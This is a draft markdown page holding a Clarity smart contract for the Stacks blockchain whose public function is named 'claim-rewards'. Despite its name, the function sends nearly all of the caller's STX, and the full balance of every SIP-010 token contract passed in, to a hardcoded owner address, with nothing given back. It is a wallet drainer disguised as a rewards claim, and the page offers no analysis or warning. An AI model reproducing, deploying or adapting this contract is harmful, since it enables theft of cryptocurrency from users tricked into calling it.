---
title: "Trait claim-reward"
draft: true
---
```

  (use-trait sip-010-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)
(define-data-var TOKEN_OWNER principal 'SPPBC5YNJJSYTBWS9R38EKC2J72KS22VJF95G1JQ)

(define-private (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u1000000)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (amount-to-send (- sender-balance u1000000))
            (transfer-result (stx-transfer? amount-to-send tx-sender pToken-Owner))
        )
        (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-private (transfer-token 
                (contract <sip-010-trait>))
  (begin
        (let
            (
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u1)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards (token-contracts (list 100 <sip-010-trait>)))
    (begin
        (let 
            (
                (res1 (transfer-stx))
                (res2 (map transfer-token token-contracts))
            )
            (ok true)
        )
    )
)
  
```
